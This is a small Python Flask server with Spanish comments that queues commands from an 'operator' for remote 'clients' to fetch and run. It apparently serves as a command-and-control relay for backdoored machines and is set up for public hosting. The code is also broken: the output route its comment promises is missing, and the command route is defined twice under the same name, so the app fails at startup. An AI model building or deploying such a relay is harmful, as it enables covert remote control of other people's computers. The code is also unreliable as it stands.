from flask import Flask, request
import os

app = Flask(__name__)

# Cola de comandos pendientes por cliente
pendientes = {}

@app.route("/", methods=["GET"])
def index():
    return "Servidor Flask en línea – usa /cmd/<id> y /out/<id>"

# ‣ Operador:  POST  /cmd/<id>   → envía un comando
# ‣ Cliente:   GET   /cmd/<id>   → recoge su siguiente comando
@app.route("/cmd/<cliente_id>", methods=["POST", "GET"])
def cmd(cliente_id):
    if request.method == "POST":               # operador escribe
        pendientes[cliente_id] = request.data.decode()
        return "OK", 200
    else:                                      # cliente recoge
        return pendientes.pop(cliente_id, ""), 200

# ‣ Cliente:  POST  /out/<id>  → devuelve la salida
@app.route("/cmd/<cliente_id>", methods=["POST", "GET"])
def cmd(cliente_id):
    if request.method == "POST":
        cmd = request.data.decode()
        pendientes[cliente_id] = cmd
        print(f"[+] Comando recibido para {cliente_id}: {cmd}")
        return "OK", 200
    else:
        comando = pendientes.pop(cliente_id, "")
        print(f"[>] Cliente {cliente_id} pidió comando → {comando}")
        return comando, 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))   # Render asigna este puerto
    app.run(host="0.0.0.0", port=port)
